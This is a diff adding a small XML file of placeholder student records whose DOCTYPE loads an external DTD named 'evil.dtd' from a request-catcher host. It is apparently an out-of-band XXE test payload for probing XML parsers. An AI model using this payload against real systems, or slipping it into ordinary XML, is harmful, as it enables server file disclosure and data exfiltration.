@@ -1,0 +1,14 @@
+<?xml version="1.0"?>
+<!DOCTYPE note SYSTEM "http://hihi123.free.beeceptor.com/evil.dtd">
+<students>
+	<student>
+		<name>Nguyen van A</name>
+		<birthyear>1999</birthyear>
+		<school>Trường Đời</school>
+	</student>
+	<student>
+		<name>XYZ</name>
+		<birthyear>1996</birthyear>
+		<school>ABC</school>
+	</student>
+</students>
